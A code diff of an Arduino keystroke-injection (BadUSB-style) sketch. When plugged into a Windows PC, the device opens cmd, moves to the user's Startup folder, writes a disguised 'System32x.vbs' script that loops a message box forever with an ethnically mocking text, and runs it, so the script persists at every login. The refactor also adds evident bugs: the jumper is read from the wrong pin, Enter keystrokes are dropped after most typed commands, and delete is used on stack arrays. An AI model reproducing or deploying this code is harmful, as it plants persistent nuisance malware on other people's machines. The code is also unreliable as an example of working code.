@@ -1,5 +1,4 @@
 #include "Keyboard_sv_SE.h"
-
 #include "Keyboard.h"
 
 char windowsKey = KEY_RIGHT_GUI;
@@ -7,85 +6,78 @@ char enterKey = KEY_RETURN;
 char tabKey = KEY_TAB;
 char altKey = KEY_LEFT_ALT;
 
-#define JUMPER_PIN 2
-#define LIGHT_PIN 13
-#define SYS_DELAY_SLOW 1000
-#define SYS_DELAY_FAST 400
-
 bool hacked = false;
 bool jumperConnected = false;
 
+enum pin{
+  JumperPin = 2,
+  LightPin = 13,
+};
+
+enum delayType{
+  Zero = 0,
+  Fast = 400,
+  Slow = 1000  
+};
+
 void setup() {
   Serial.begin(9600);
-  pinMode(JUMPER_PIN, INPUT);
-  pinMode(LIGHT_PIN, OUTPUT);
+  pinMode(JumperPin, INPUT);
+  pinMode(LightPin, OUTPUT);
 }
 
 void loop() {
-  jumperConnected = digitalRead(JUMPER_PIN);
-  delay(SYS_DELAY_SLOW);
-  if(true){
+  delay(Slow);
+  jumperConnected = digitalRead(LightPin);
+  delay(Slow);
+  if(jumperConnected){
       if(hacked) {
-        digitalWrite(LIGHT_PIN, HIGH);
-        delay(100);
-        digitalWrite(LIGHT_PIN, LOW);
-        delay(100);
+        digitalWrite(LightPin, HIGH);
+        delay(Fast);
+        digitalWrite(LightPin, LOW);
+        delay(Fast);
       }
       else{
         Keyboard.begin(KeyboardLayout_sv_SE);
 
-        delay(SYS_DELAY_SLOW);
+        delay(Slow);
 
         char openRunKeys[] = {windowsKey, 'r'};
         PressKeys(openRunKeys, 2);
         delete openRunKeys;
 
-        delay(SYS_DELAY_FAST);
+        delay(Fast);
 
-        Keyboard.press('c');
-        Keyboard.releaseAll();
-        Keyboard.press('m');
-        Keyboard.releaseAll();
-        Keyboard.press('d');
-        Keyboard.releaseAll();
+        PressAndRelease('c');
+        PressAndRelease('m');
+        PressAndRelease('d');
 
-        delay(SYS_DELAY_FAST);
+        delay(Fast);
 
-        Keyboard.press(KEY_RETURN);
-        Keyboard.releaseAll();
+        PressAndRelease(KEY_RETURN);
 
-        delay(SYS_DELAY_FAST);
+
+        delay(Fast);
 
         Keyboard.print("cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
-        Keyboard.press(enterKey);
-        Keyboard.release(enterKey);
 
         Keyboard.print("del System32x.vbs");
-        Keyboard.press(enterKey);
-        Keyboard.release(enterKey);
 
         Keyboard.print("echo do > System32x.vbs");
-        Keyboard.press(enterKey);
-        Keyboard.release(enterKey);
 
         Keyboard.print("echo msgbox(\"Indian Tech Support Is Here\") >> System32x.vbs");
-        Keyboard.press(enterKey);
-        Keyboard.release(enterKey);
 
         Keyboard.print("echo loop >> System32x.vbs");
-        Keyboard.press(enterKey);
-        Keyboard.release(enterKey);
 
-        Keyboard.print("System32x.vbs");
-        Keyboard.press(enterKey);
-        Keyboard.release(enterKey);
+        ConsoleWrite("System32x.vbs");
 
-        delay(SYS_DELAY_SLOW);
+        delay(Slow);
+
         char switchBackToCmdKeys[] = {altKey, tabKey};
         PressKeys(switchBackToCmdKeys, 2);
         delete switchBackToCmdKeys;
 
-        delay(SYS_DELAY_SLOW);
+        delay(Slow);
 
         char closeCmdKeys[] = {altKey, KEY_F4};
         PressKeys(closeCmdKeys, 2);
@@ -113,8 +105,12 @@ void PressKeys(char keys[], int keysLength){
   }
 }
 
+void PressAndRelease(char key){
+  Keyboard.press(key);
+  Keyboard.releaseAll();
+}
+
 void ConsoleWrite(String message){
-  delay(SYS_DELAY_SLOW);
   Keyboard.print(message);
   Keyboard.press(enterKey);
   Keyboard.release(enterKey);
